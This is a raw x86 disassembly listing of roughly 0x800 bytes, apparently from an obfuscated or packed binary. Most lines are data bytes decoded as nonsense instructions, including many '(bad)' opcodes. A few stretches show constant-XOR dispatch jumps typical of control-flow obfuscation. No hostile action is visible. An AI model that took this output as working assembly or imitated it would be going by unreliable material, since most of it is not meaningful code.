  414de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dea:	ja     0x414e1d
  414dec:	loop   0x414e2e
  414dee:	cmp    DWORD PTR [eax+eax*4+0x58e8edc7],edi
  414df5:	sbb    edi,ecx
  414df7:	icebp  
  414df8:	xor    eax,0xd09c9ea5
  414dfd:	mov    bh,ah
  414dff:	mov    BYTE PTR [edx+ecx*4+0x78],bl
  414e03:	sub    BYTE PTR [esi],0x66
  414e06:	cmp    dl,cl
  414e08:	mov    dh,0x4c
  414e0a:	jp     0x414e53
  414e0c:	pop    esi
  414e0d:	xchg   ebx,eax
  414e0e:	inc    edx
  414e0f:	(bad)  
  414e10:	stc    
  414e11:	jbe    0x414e62
  414e13:	ins    BYTE PTR es:[edi],dx
  414e14:	xchg   edx,eax
  414e15:	jb     0x414e2b
  414e17:	aas    
  414e18:	scas   eax,DWORD PTR es:[edi]
  414e19:	mov    ch,0xaa
  414e1b:	cwde   
  414e1c:	sub    ch,BYTE PTR [eax]
  414e1e:	push   0xb4934634
  414e23:	lea    esi,[ebx+0x2bd1285c]
  414e29:	inc    edi
  414e2a:	fdiv   DWORD PTR [edx]
  414e2c:	pop    ss
  414e2d:	xor    cl,BYTE PTR [esp+ebx*8+0x34]
  414e31:	jns    0x414dbe
  414e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e34:	xchg   ecx,eax
  414e35:	in     eax,0x28
  414e37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e38:	and    dh,BYTE PTR [ecx+0x581f5323]
  414e3e:	jo     0x414e62
  414e40:	xchg   edx,eax
  414e41:	fwait
  414e42:	inc    edx
  414e43:	adc    ah,BYTE PTR [ecx-0x704e9631]
  414e49:	push   ebx
  414e4a:	adc    BYTE PTR [ebx-0xeac9d5d],ah
  414e50:	inc    ebx
  414e51:	mov    BYTE PTR [ecx+0x1fdffebc],bl
  414e57:	push   esi
  414e58:	ret    0xb0da
  414e5b:	and    eax,0x27d1c90c
  414e60:	lock mov eax,0x708e202d
  414e66:	fcomp  DWORD PTR [ecx-0x5aa7943a]
  414e6c:	std    
  414e6d:	call   0xe629:0xdb8805fc
  414e74:	add    ebp,DWORD PTR ds:[edx-0x6df62897]
  414e7b:	stc    
  414e7c:	lods   eax,DWORD PTR ds:[esi]
  414e7d:	mov    ecx,DWORD PTR cs:[ecx]
  414e80:	inc    ebp
  414e81:	inc    edx
  414e82:	mov    edi,0xc84f0b41
  414e87:	les    ebp,FWORD PTR ds:0x49056a59
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	dec    ebp
  414ead:	das    
  414eae:	sbb    DWORD PTR [esp+eiz*4],eax
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414f01
  414eb9:	sbb    BYTE PTR [ebx+0x71],ch
  414ebc:	adc    dl,BYTE PTR [edx-0x1310e871]
  414ec2:	push   edi
  414ec3:	adc    eax,0xa3578560
  414ec8:	(bad)  
  414ec9:	jnp    0x414ec4
  414ecb:	mov    BYTE PTR [ebp+0x1d9993fd],al
  414ed1:	ret    0xd02c
  414ed4:	jmp    DWORD PTR [ebx+0x29]
  414ed7:	sub    esi,ebx
  414ed9:	mov    ah,0x85
  414edb:	call   0x5913:0xda95ab6a
  414ee2:	xchg   ebx,eax
  414ee3:	retf   0x3a2d
  414ee6:	add    al,ah
  414ee8:	jno    0x414f4f
  414eea:	cwde   
  414eeb:	sahf   
  414eec:	outs   dx,BYTE PTR ds:[esi]
  414eed:	push   0x23ac913e
  414ef2:	xchg   ebx,eax
  414ef3:	sub    edx,DWORD PTR [ecx]
  414ef5:	js     0x414e95
  414ef7:	xchg   BYTE PTR [edx+0x3844a28d],al
  414efd:	vunpckhps ymm6,ymm1,YMMWORD PTR ds:0xbdd103d9
  414f05:	inc    eax
  414f06:	dec    edx
  414f07:	in     al,dx
  414f08:	add    BYTE PTR [esi-0x57180f11],0xc3
  414f0f:	js     0x414ec2
  414f11:	sub    BYTE PTR [eax-0x4d],0x13
  414f15:	leave  
  414f16:	sub    al,0x74
  414f18:	pop    edi
  414f19:	(bad)  ds:0xbd256d87
  414f1f:	push   eax
  414f20:	in     eax,0x94
  414f22:	mov    WORD PTR [edi],gs
  414f24:	gs scas al,BYTE PTR es:[edi]
  414f26:	inc    ecx
  414f27:	mov    bh,0x9e
  414f29:	int3   
  414f2a:	mov    al,0x60
  414f2c:	in     eax,0xd2
  414f2e:	cdq    
  414f2f:	out    0x15,eax
  414f31:	ja     0x414ed9
  414f33:	sbb    eax,0x52ef4b0c
  414f38:	mov    ds:0x2072cffc,eax
  414f3d:	cwde   
  414f3e:	(bad)  
  414f3f:	int3   
  414f40:	mov    ebp,0xd779f310
  414f45:	mov    al,0x98
  414f47:	jae    0x414fb7
  414f49:	dec    edx
  414f4a:	and    cl,al
  414f4c:	ret    0x76cd
  414f4f:	rcl    BYTE PTR [edx+eiz*8+0xe],1
  414f53:	aaa    
  414f54:	mov    al,ds:0x497cf764
  414f59:	rol    BYTE PTR [bx+si],0xa9
  414f5d:	(bad)  
  414f5e:	xchg   esp,eax
  414f5f:	cmc    
  414f60:	mov    eax,ds:0xdcf985ef
  414f65:	lods   al,BYTE PTR ds:[esi]
  414f66:	jns    0x414fb3
  414f68:	test   di,0xa31d
  414f6d:	dec    eax
  414f6e:	pop    edi
  414f6f:	cmp    edx,DWORD PTR [esi-0x57]
  414f72:	and    al,0x69
  414f74:	js     0x414f6f
  414f76:	fnstenv [ecx-0x354523f6]
  414f7c:	pop    ss
  414f7d:	cmp    DWORD PTR [ebp+0x72],edx
  414f80:	mov    eax,ds:0x8d997d64
  414f85:	inc    edi
  414f86:	(bad)  
  414f87:	nop
  414f88:	leave  
  414f89:	xor    eax,0xe38dd1a9
  414f8e:	mov    bl,0xf1
  414f90:	loope  0x414f32
  414f92:	sub    ah,BYTE PTR [edx]
  414f94:	cmp    BYTE PTR ds:0xf1cb6e28,ch
  414f9a:	sub    DWORD PTR [ebp+0x72],eax
  414f9d:	scas   al,BYTE PTR es:[edi]
  414f9e:	jb     0x414f27
  414fa0:	sub    ax,0x8009
  414fa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fa5:	int    0xf3
  414fa7:	mov    ebp,0x2f873732
  414fac:	sbb    eax,0x93d866c4
  414fb1:	mov    al,0x43
  414fb3:	ret    
  414fb4:	inc    ebx
  414fb5:	sub    al,0x7
  414fb7:	fsub   st(1),st
  414fb9:	sahf   
  414fba:	daa    
  414fbb:	ja     0x415039
  414fbd:	mov    DWORD PTR [ebp+0x71],0x267e0748
  414fc4:	sub    ecx,DWORD PTR [edi+0x4416c06c]
  414fca:	or     eax,0x94830612
  414fcf:	cs dec edx
  414fd1:	test   eax,0xee45c4aa
  414fd6:	add    al,0xcf
  414fd8:	ror    BYTE PTR [esi],cl
  414fda:	adc    BYTE PTR [ebx-0x5df02917],bh
  414fe0:	sbb    esi,esp
  414fe2:	mov    esi,0x225bcf5a
  414fe7:	xchg   esp,eax
  414fe8:	vpmadcsswd ymm7,ymm3,YMMWORD PTR [esi+0x4fbf94bb],ymm0
  414ff2:	bound  ebp,QWORD PTR ds:0x7202ca74
  414ff8:	mov    bh,0x48
  414ffa:	fisub  WORD PTR [edi+0x59]
  414ffd:	(bad)  
  414ffe:	es call 0xe2cb78ae
  415004:	int3   
  415005:	test   ecx,edi
  415007:	or     bl,BYTE PTR [eax+0x69ba26bd]
  41500d:	(bad)
  415010:	inc    ebp
  415011:	lds    esi,FWORD PTR [esi]
  415013:	pop    esi
  415014:	out    0xfe,eax
  415016:	arpl   dx,dx
  415018:	pop    ss
  415019:	lds    edi,FWORD PTR [ecx-0x2922f611]
  41501f:	fucomip st,st(1)
  415021:	xchg   edx,edi
  415023:	mov    ds:0xf244519c,eax
  415028:	inc    ecx
  41502a:	gs leave 
  41502c:	ss mov al,0x58
  41502f:	pop    ebp
  415030:	daa    
  415031:	push   ebx
  415032:	jo     0x415071
  415034:	mov    eax,0xfbe7ceee
  415039:	ret    
  41503a:	in     eax,dx
  41503b:	stos   BYTE PTR es:[edi],al
  41503c:	sub    ebp,DWORD PTR [ebp-0x2]
  41503f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415040:	je     0x41502f
  415042:	pop    edx
  415043:	(bad)  
  415044:	fimul  DWORD PTR [ebx+ebp*8-0x24]
  415048:	sbb    bl,BYTE PTR [ebx-0x13]
  41504b:	rol    BYTE PTR [eax],1
  41504d:	(bad)  [ebp-0x13]
  415050:	int3   
  415051:	or     eax,0x4afd1c78
  415056:	and    eax,0x61b33220
  41505b:	adc    al,0xf9
  41505d:	dec    ecx
  41505e:	mov    ch,0x2a
  415060:	xchg   esi,eax
  415061:	jo     0x414fe6
  415063:	add    bl,BYTE PTR gs:[ebp-0xe]
  415067:	adc    DWORD PTR [eax-0x67aad400],esi
  41506d:	lahf   
  41506e:	and    ebp,DWORD PTR [ecx+0x58]
  415071:	inc    esp
  415072:	sub    dh,dh
  415074:	adc    eax,0x1a3162f6
  415079:	pop    eax
  41507a:	sub    ah,BYTE PTR [ebx+0x7d]
  41507d:	(bad)  
  41507e:	fsincos 
  415080:	aam    0x9e
  415082:	cmp    BYTE PTR [edx],bl
  415084:	xchg   esp,eax
  415085:	int    0x80
  415087:	je     0x415015
  415089:	in     al,0x3e
  41508b:	and    dh,0xed
  41508e:	bound  ebp,QWORD PTR [esi]
  415090:	out    0xcc,eax
  415092:	data16 cs loopne 0x415067
  415096:	lods   al,BYTE PTR ds:[esi]
  415097:	fidiv  DWORD PTR [edx]
  415099:	xchg   BYTE PTR [ebp-0x276ceae0],al
  41509f:	daa    
  4150a0:	add    al,0x64
  4150a2:	xchg   edi,eax
  4150a3:	jmp    0x41508e
  4150a5:	rol    BYTE PTR [esi+0x5782685e],cl
  4150ab:	sub    al,BYTE PTR [esi]
  4150ad:	test   dh,ah
  4150af:	cmp    eax,0xe4d1b7fa
  4150b4:	(bad)  
  4150b5:	jmp    0xcedf:0x65f8b614
  4150bc:	adc    al,0xfb
  4150be:	and    ah,BYTE PTR [esi]
  4150c0:	or     DWORD PTR [ecx],edx
  4150c2:	sar    bl,1
  4150c4:	arpl   di,sp
  4150c6:	pop    esp
  4150c7:	dec    edi
  4150c8:	mov    edx,0x31abcd55
  4150cd:	fist   WORD PTR [ecx-0x6af1bbc7]
  4150d3:	pop    esp
  4150d4:	cdq    
  4150d5:	jb     0x415072
  4150d7:	cmp    ebx,ecx
  4150d9:	sti    
  4150da:	dec    edi
  4150db:	ja     0x4150df
  4150dd:	fwait
  4150de:	mov    eax,ds:0x1517137b
  4150e4:	mov    BYTE PTR [edx+0x21f9c597],bl
  4150ea:	(bad)  
  4150eb:	std    
  4150ec:	jmp    DWORD PTR [esi+0x6eb3dc73]
  4150f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150f3:	mov    cl,0xfb
  4150f5:	rol    ebx,0xdc
  4150f8:	sub    esp,eax
  4150fa:	cmp    eax,0x53d332a8
  4150ff:	ds cwde 
  415101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415102:	xor    eax,0x6ef530d1
  415107:	popf   
  415108:	icebp  
  415109:	and    al,0xb3
  41510b:	sbb    al,0x22
  41510d:	jo     0x4150bf
  41510f:	les    esp,FWORD PTR [esi-0x29]
  415112:	aad    0xf1
  415114:	js     0x41516e
  415116:	mov    ebp,0x75aa2396
  41511b:	push   0xa2c01579
  415120:	mov    bl,0x74
  415122:	xlat   BYTE PTR ds:[ebx]
  415123:	add    eax,0xe29b7a1e
  415128:	mov    al,ds:0xffcad774
  41512d:	or     al,0xa8
  41512f:	add    DWORD PTR [ebx-0x1f],esp
  415132:	mov    ah,BYTE PTR [edi]
  415134:	and    BYTE PTR [edi+0x5b],0x38
  415138:	cmp    BYTE PTR [esi+0x57],cl
  41513b:	mov    al,ds:0x75cf3993
  415140:	fdivr  QWORD PTR [edi+0x7f1739c9]
  415146:	ins    BYTE PTR es:[edi],dx
  415147:	ret    
  415148:	loop   0x41513a
  41514a:	pop    ebx
  41514b:	(bad)  
  41514c:	adc    esi,DWORD PTR es:[ecx]
  41514f:	aas    
  415150:	je     0x4151c7
  415152:	or     BYTE PTR [esi+0x67f3e2b5],dl
  415158:	jae    0x415100
  41515a:	adc    DWORD PTR [ecx],edx
  41515c:	es push ebp
  41515e:	movups xmm2,XMMWORD PTR [eax+0x7312843c]
  415165:	push   ss
  415166:	dec    edi
  415167:	mov    cl,0xc3
  415169:	ds xchg esi,eax
  41516b:	lds    ecx,FWORD PTR [esi]
  41516d:	push   DWORD PTR [edx+0x92246bc]
  415173:	fsubr  DWORD PTR [edi+0x585f1b97]
  415179:	sahf   
  41517a:	das    
  41517b:	and    al,BYTE PTR [ebx-0x1fd4e98e]
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fnstcw WORD PTR [esi+0x16]
  4151a6:	sar    DWORD PTR [ebp+ebp*8-0x468f80fb],1
  4151ad:	jle    0x41521f
  4151af:	jo     0x4151ba
  4151b1:	clc    
  4151b2:	mov    DWORD PTR [eax-0x36098182],ecx
  4151b8:	cli    
  4151b9:	in     eax,dx
  4151ba:	aas    
  4151bb:	push   cs
  4151bc:	stos   BYTE PTR es:[edi],al
  4151bd:	pop    edx
  4151be:	inc    esi
  4151bf:	push   ecx
  4151c0:	stos   DWORD PTR es:[edi],eax
  4151c1:	popf   
  4151c2:	jmp    0xa224:0x2ea3fad4
  4151c9:	fwait
  4151ca:	or     BYTE PTR [ecx+0x4420bc0f],dh
  4151d0:	and    DWORD PTR [edi+0x27],edx
  4151d3:	test   eax,0x22d442b
  4151d8:	xchg   ecx,eax
  4151d9:	cmp    BYTE PTR ds:0xe4f2394e,al
  4151df:	test   eax,0xa4cd650c
  4151e4:	lahf   
  4151e5:	scas   eax,DWORD PTR es:[edi]
  4151e6:	push   di
  4151e8:	(bad)  
  4151e9:	pop    ds
  4151ea:	jb     0x415268
  4151ec:	xor    eax,0xf78209e8
  4151f1:	or     al,0x3e
  4151f3:	fwait
  4151f4:	sbb    BYTE PTR [ebx],cl
  4151f6:	and    DWORD PTR [edx+0x19],edi
  4151f9:	mov    cl,0x3b
  4151fb:	xchg   BYTE PTR [edx+0x66],dl
  4151fe:	es ja  0x415186
  415201:	gs int 0x38
  415204:	test   esp,ebp
  415206:	lahf   
  415207:	jge    0x41518d
  415209:	daa    
  41520a:	cmc    
  41520b:	lock jns 0x415224
  41520e:	out    0x5d,eax
  415210:	shr    ah,0xd7
  415213:	sub    eax,0x2f5b3055
  415218:	daa    
  415219:	outs   dx,BYTE PTR ds:[esi]
  41521a:	sar    BYTE PTR [ebp-0x16],1
  41521d:	sbb    ebx,DWORD PTR [edx]
  41521f:	icebp  
  415220:	mov    BYTE PTR [esi],ah
  415222:	jecxz  0x4151fa
  415224:	add    dl,BYTE PTR [esi]
  415226:	mov    eax,ds:0x100f3178
  41522b:	mov    WORD PTR [edi+eiz*1],?
  41522e:	xor    al,0x25
  415230:	hlt    
  415231:	jecxz  0x415279
  415233:	or     DWORD PTR [ebx+0x47],esi
  415236:	dec    ecx
  415237:	jg     0x415247
  415239:	outs   dx,DWORD PTR ds:[esi]
  41523a:	aad    0x91
  41523c:	cs and bl,cl
  41523f:	leave  
  415240:	jmp    0x415220
  415242:	mov    es,WORD PTR [ecx+0x16405156]
  415248:	push   ds
  415249:	cmp    eax,0x27962531
  41524e:	or     edi,DWORD PTR [ecx]
  415250:	dec    eax
  415251:	cmc    
  415252:	xchg   esp,eax
  415253:	add    DWORD PTR es:[ebx-0x4bcfd0de],edi
  41525a:	jmp    0x9821:0xb5049836
  415261:	adc    DWORD PTR [esi-0x2a82dbe1],0xffffff91
  415268:	stos   BYTE PTR es:[edi],al
  415269:	pop    esi
  41526a:	ds cmc 
  41526c:	iret   
  41526d:	sub    eax,0xc15bd5b4
  415272:	sub    eax,0x24da61a
  415277:	push   0x30
  415279:	pop    ds
  41527a:	je     0x41523d
  41527c:	dec    ebx
  41527d:	lahf   
  41527e:	int3   
  41527f:	pop    esp
  415280:	rol    esp,cl
  415282:	or     dh,al
  415284:	adc    esp,DWORD PTR [eax+0x13]
  415287:	and    BYTE PTR [ebp+0x4f710322],dl
  41528d:	inc    ebx
  41528e:	ja     0x4152c4
  415290:	add    al,0x5b
  415292:	in     al,dx
  415293:	xchg   esi,eax
  415294:	dec    eax
  415295:	or     al,0xa
  415297:	pop    ds
  415298:	pop    ecx
  415299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41529a:	xor    al,0xfb
  41529c:	iret   
  41529d:	in     eax,0xab
  41529f:	ss (bad) 
  4152a1:	jne    0x41528f
  4152a3:	out    0x2e,al
  4152a5:	inc    edx
  4152a6:	push   0x21b519f7
  4152ab:	jmp    0xadb3b957
  4152b0:	cmp    eax,0x958ddfa6
  4152b5:	in     eax,0x20
  4152b7:	and    BYTE PTR [ecx],0x3c
  4152ba:	jecxz  0x4152fe
  4152bc:	lahf   
  4152bd:	rol    BYTE PTR [ebx-0x14],1
  4152c0:	pop    edi
  4152c1:	jno    0x41528a
  4152c3:	jmp    0x415325
  4152c5:	repz adc al,0x41
  4152c8:	retf   
  4152c9:	lods   al,BYTE PTR ds:[esi]
  4152ca:	jle    0x41529a
  4152cc:	add    ecx,DWORD PTR [esi+0x2a]
  4152cf:	fidiv  WORD PTR fs:[eax]
  4152d2:	sbb    DWORD PTR [esi],eax
  4152d4:	or     BYTE PTR [edx-0x57],ah
  4152d7:	ror    DWORD PTR [ebx+0x26086210],1
  4152dd:	and    al,0xaf
  4152df:	push   ds
  4152e0:	push   ecx
  4152e1:	aad    0x39
  4152e3:	call   0x298c:0x997d50d1
  4152ea:	test   DWORD PTR [eax+0x2b062589],eax
  4152f0:	cmp    edx,eax
  4152f2:	lahf   
  4152f3:	fisub  DWORD PTR [edi+0x6db3819d]
  4152f9:	push   DWORD PTR [edx+0x20]
  4152fc:	mov    ah,0x69
  4152fe:	lods   al,BYTE PTR ds:[esi]
  4152ff:	jmp    0x1c5d8adb
  415304:	add    al,0x74
  415306:	lea    ebp,[esi-0x7e]
  415309:	out    0x58,al
  41530b:	inc    ecx
  41530c:	inc    esp
  41530d:	pop    ecx
  41530e:	jb     0x4152c9
  415310:	dec    ecx
  415311:	js     0x415347
  415313:	sbb    eax,0x87da4a3c
  415318:	es push 0xd02102e2
  41531e:	enter  0xa636,0x9
  415322:	in     eax,dx
  415323:	add    dl,ah
  415325:	fstp   DWORD PTR [eax]
  415327:	jle    0x4152fb
  415329:	sub    ebp,ecx
  41532b:	xchg   ebx,eax
  41532c:	sub    esp,DWORD PTR [ebx]
  41532e:	pop    edi
  41532f:	jns    0x415369
  415331:	xor    al,0x2a
  415333:	xor    BYTE PTR [ecx+ebp*8],0x30
  415337:	add    DWORD PTR [ecx-0x44cb02c5],0xffffffb9
  41533e:	and    bh,BYTE PTR [edx]
  415340:	adc    bl,BYTE PTR [ebx-0x74f4f39b]
  415346:	cld    
  415347:	mov    bl,0x0
  415349:	(bad)  
  41534a:	lea    edx,[eax-0x64]
  41534d:	mov    dh,0x1a
  41534f:	pop    esi
  415350:	jecxz  0x4152dd
  415352:	lods   al,BYTE PTR ds:[esi]
  415353:	(bad)  
  415354:	jp     0x415305
  415356:	cmp    ebx,ecx
  415358:	fdivr  QWORD PTR [ecx]
  41535a:	sbb    dh,BYTE PTR [ebx+0x31]
  41535d:	out    0x2d,eax
  41535f:	(bad)  
  415360:	in     al,0xd4
  415362:	pop    esi
  415363:	adc    eax,0x3134a60d
  415368:	adc    DWORD PTR [esp+ebp*8+0x7a],edi
  41536c:	adc    BYTE PTR [edi-0x7c],0x83
  415370:	jo     0x415374
  415372:	inc    ebp
  415373:	dec    ecx
  415374:	(bad)  
  415375:	xchg   esp,eax
  415376:	ins    BYTE PTR es:[edi],dx
  415377:	mov    bh,0x15
  415379:	jbe    0x4153bb
  41537b:	and    BYTE PTR [edx-0x61],cl
  41537e:	or     al,0x1d
  415380:	ins    BYTE PTR es:[edi],dx
  415381:	sbb    DWORD PTR [edi],edi
  415383:	xor    esi,ebx
  415385:	inc    esp
  415386:	test   BYTE PTR [ecx],0xd6
  415389:	inc    ebp
  41538a:	add    DWORD PTR [edi+edx*2+0x456b6c61],ebp
  415391:	fild   WORD PTR [edi]
  415393:	or     dl,BYTE PTR [ecx]
  415395:	push   edi
  415396:	cmp    eax,0x76fe593f
  41539b:	jmp    0x4ed2:0xa23125f2
  4153a2:	dec    esp
  4153a3:	sub    cl,BYTE PTR [eax-0x168e538b]
  4153a9:	inc    ebx
  4153aa:	xchg   ecx,eax
  4153ab:	aaa    
  4153ac:	popa   
  4153ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ae:	cmp    DWORD PTR [ebx],edi
  4153b0:	jb     0x415378
  4153b2:	data16 cmc 
  4153b4:	or     al,0xec
  4153b6:	jmp    0xde229d75
  4153bb:	pop    esi
  4153bc:	je     0x41537f
  4153be:	pop    ecx
  4153bf:	dec    esp
  4153c0:	mov    ebp,0xc80334e4
  4153c5:	push   0xc1fad459
  4153ca:	push   eax
  4153cb:	scas   eax,DWORD PTR es:[edi]
  4153cc:	cs mov bl,0xc1
  4153cf:	xor    esp,esp
  4153d1:	jb     0x415416
  4153d3:	jl     0x415386
  4153d5:	xchg   ebp,eax
  4153d6:	loope  0x4153df
  4153d8:	in     eax,dx
  4153d9:	int    0xd2
  4153db:	inc    esp
  4153dc:	into   
  4153dd:	adc    bh,dh
  4153df:	rol    DWORD PTR [bp+si],0xf2
  4153e3:	add    esp,DWORD PTR [esi-0x5e10c01b]
  4153e9:	xchg   ebx,eax
  4153ea:	sbb    DWORD PTR [eax],edx
  4153ec:	push   0x467a15cc
  4153f1:	push   ebx
  4153f3:	pop    DWORD PTR [ecx]
  4153f5:	sub    eax,0xbe286318
  4153fa:	xchg   ecx,eax
  4153fb:	mov    dh,0xc9
  4153fd:	in     al,dx
  4153fe:	push   ecx
  4153ff:	xchg   edx,eax
  415400:	(bad)  
  415401:	pop    ss
  415402:	push   ss
  415403:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415405:	mov    ch,0x2b
  415407:	inc    ebp
  415408:	inc    ebx
  415409:	int    0x69
  41540b:	push   esp
  41540c:	test   BYTE PTR [ecx+eax*1+0x18b2b8bf],ah
  415413:	sbb    DWORD PTR [eax-0x644d35a5],edx
  415419:	jae    0x4153db
  41541b:	iret   
  41541c:	idiv   BYTE PTR [edx+0x32c96857]
  415422:	jg     0x41541e
  415424:	icebp  
  415425:	dec    ebx
  415426:	mov    ebx,0x4bc819c5
  41542b:	cmp    esp,esp
  41542d:	mov    BYTE PTR [ebp+eiz*4-0x5b70cec0],0x55
  415435:	ficomp WORD PTR [bx+0x75da]
  41543a:	sub    esi,DWORD PTR ds:0xcd22f36f
  415440:	jle    0x4153da
  415442:	jmp    0x88ecfd
  415447:	or     eax,0x43341634
  41544c:	inc    edx
  41544d:	aas    
  41544e:	cmp    BYTE PTR [eax],0x15
  415451:	pop    ss
  415452:	push   edx
  415453:	fwait
  415454:	repnz enter 0x21ad,0x8c
  415459:	cmp    ebp,esi
  41545b:	(bad)  
  41545c:	lock adc edx,DWORD PTR [ebx-0x6623e852]
  415463:	fsubp  st(4),st
  415465:	cli    
  415466:	xor    ebp,DWORD PTR [edi-0x3e92fccf]
  41546c:	mov    eax,0x4b7e1238
  415471:	or     ebp,esi
  415473:	cmp    eax,0x3988da8
  415478:	ret    0x4589
  41547b:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xbb
  4154c8:	les    esi,FWORD PTR [ebx-0x3]
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0x7f70707e
  4154d4:	out    dx,eax
  4154d5:	jae    0x41551a
  4154d7:	pushf  
  4154d8:	and    ah,ch
  4154da:	pop    eax
  4154db:	fld    QWORD PTR [ebx+ebx*8-0x7c]
  4154df:	cs jmp 0x33305755
  4154e5:	sbb    dl,bl
  4154e7:	xchg   ebp,eax
  4154e8:	iret   
  4154e9:	ins    DWORD PTR es:[edi],dx
  4154ea:	pop    eax
  4154eb:	out    0xb8,eax
  4154ed:	pop    esi
  4154ee:	jecxz  0x41549c
  4154f0:	mov    ebp,0x7fb9a308
  4154f5:	jnp    0x4154cd
  4154f7:	pop    ebx
  4154f8:	mov    ebx,DWORD PTR [edx]
  4154fa:	xor    BYTE PTR [ecx-0x213ee32],ch
  415500:	cmp    cl,BYTE PTR [ebx+0x7]
  415503:	imul   eax,esi,0xffffffc2
  415506:	add    ebp,ebp
  415508:	dec    edi
  415509:	mov    eax,ds:0x22aaafba
  41550e:	fcomp  QWORD PTR [edi+0x5b]
  415512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415513:	test   al,0x19
  415515:	xor    al,0x93
  415517:	(bad)  
  415518:	scas   eax,DWORD PTR es:[edi]
  415519:	ret    0xa54b
  41551c:	mov    esi,0x99092559
  415521:	(bad)  
  415522:	sbb    BYTE PTR [ebp-0x384a8a28],al
  415528:	sar    DWORD PTR [edi+0x72],0x59
  41552c:	push   ecx
  41552d:	imul   BYTE PTR [ebx-0x3766e2c7]
  415533:	scas   al,BYTE PTR es:[edi]
  415534:	mov    bh,0xb6
  415536:	inc    edi
  415537:	mov    BYTE PTR [edi+0xc],ah
  41553a:	scas   eax,DWORD PTR es:[edi]
  41553b:	cli    
  41553c:	add    eax,0x1a6fe69d
  415541:	push   ds
  415542:	and    al,ch
  415544:	mov    ds:0xacf826e9,eax
  415549:	js     0x415577
  41554b:	push   cs
  41554c:	and    DWORD PTR [edx+eiz*8],edx
  41554f:	dec    edi
  415550:	ret    
  415551:	stc    
  415552:	popf   
  415553:	or     ch,BYTE PTR [ecx+0x218d4b34]
  415559:	xor    dl,BYTE PTR [edi+0x1e5c2a76]
  41555f:	add    al,0x54
  415561:	sbb    dh,BYTE PTR [esi]
  415563:	dec    ebp
  415564:	sub    ch,BYTE PTR [ebx-0x37]
  415567:	xchg   ecx,eax
  415568:	jecxz  0x415587
  41556a:	lahf   
  41556b:	rol    BYTE PTR [ebx],0x85
  41556e:	pop    ebp
  41556f:	shl    BYTE PTR [ebp-0x3af0a459],0x27
  415576:	jae    0x4154ff
  415578:	test   eax,0x6d14b39e
  41557d:	ret    
  41557e:	stc    
  41557f:	fidiv  DWORD PTR ds:0xeaf9f2ad
  415585:	xchg   ecx,eax
  415586:	mov    cl,0x92
  415588:	lahf   
  415589:	ss das 
  41558b:	adc    eax,0x74b16099
  415590:	sub    DWORD PTR [ebx+0x19],ecx
  415593:	pop    ss
  415594:	adc    eax,0x666ac067
  415599:	and    eax,0xa9be89e4
  41559e:	cld    
  41559f:	lods   eax,DWORD PTR ds:[esi]
  4155a0:	xchg   DWORD PTR [edx+0x73],esi
  4155a3:	pop    eax
  4155a4:	mov    bh,0xec
  4155a7:	mov    eax,0xcb6cb8c1
  4155ac:	or     BYTE PTR [edx],ch
  4155ae:	lahf   
  4155af:	jge    0x415558
  4155b1:	ins    BYTE PTR es:[edi],dx
  4155b2:	and    eax,0xf8f4f9ea
  4155b7:	mov    al,ds:0x52638a09
  4155bc:	ins    BYTE PTR es:[edi],dx
  4155bd:	xchg   ebp,eax
  4155be:	ds lahf 
  4155c0:	lock sub al,0xd8
  4155c3:	and    eax,DWORD PTR [eax+ebx*2-0x19]
  4155c7:	and    edi,edx
  4155c9:	cmc    
  4155ca:	xchg   ebp,eax
  4155cb:	aaa    
  4155cc:	fst    st(2)
  4155ce:	cwde   
  4155cf:	pop    ebx
  4155d0:	(bad)  
  4155d1:	push   esi
  4155d2:	add    bh,BYTE PTR [eax+eiz*4]
  4155d5:	inc    esp
  4155d6:	add    eax,0x285b911a
  4155db:	imul   esp
  4155dd:	mov    dl,dl
  4155df:	loope  0x415644
